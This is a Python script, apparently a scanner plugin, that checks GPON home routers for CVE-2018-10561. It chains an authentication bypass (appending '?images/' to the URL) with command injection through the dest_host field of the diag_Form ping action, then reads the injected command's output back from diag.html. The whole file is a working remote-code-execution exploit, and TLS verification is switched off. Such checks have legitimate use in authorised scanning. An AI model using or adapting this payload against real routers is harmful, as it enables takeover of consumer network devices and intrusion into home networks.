# coding=utf-8

import sys
import requests
import time
import urllib.request, urllib.error, urllib.parse
import re
import ssl
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def send_command(url_bypass, payload):
    print("Sending injection command......")
    try:
        req = requests.Request('POST',url_bypass, data=payload)
        prepared = req.prepare()
        s = requests.Session()
        s.send(prepared)
    except Exception as e:
        print(str(e))
        pass

def retrieve_results(target, command):
    try:
        fp = urllib.request.urlopen(target + '/diag.html?images/', context=ctx,timeout=30)
        for line in fp.readlines():
            if 'diag_result = \"Can\'t resolv hostname for' in line:
                start = '['
                end = ';' + command +']'
                res = str(line[line.find(start)+len(start):line.rfind(end)])
                return res.replace('\\n', '\n')
            else:
                pass
    except Exception as e:
        pass
    msg = "NOOOOOOOOOOOO"
    return msg


def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if rce vul on GPON home routers (CVE-2018-10561)')
    try:
        command = 'id'
        url_bypass = url + '/GponForm/diag_Form?images/'
        payload = 'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`' + command + '`;' + command + '&ipv=0'
        payload = payload.encode('utf-8')
        send_command(url_bypass, payload)
        time.sleep(3)
        out = retrieve_results(url,command)
        if out != "NOOOOOOOOOOOO":
            if 'uid' in out:
                msg = 'There is CVE-2018-10561 GPON remote code exec vul on url: ' +url_bypass+ ' .'
                print(msg)
                number = 'v77'
                return True,url,number,msg
            else:
                pass
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no CVE-2018-10561 GPON remote code exec vul'
    number = 'v0'
    return False,url,number,msg




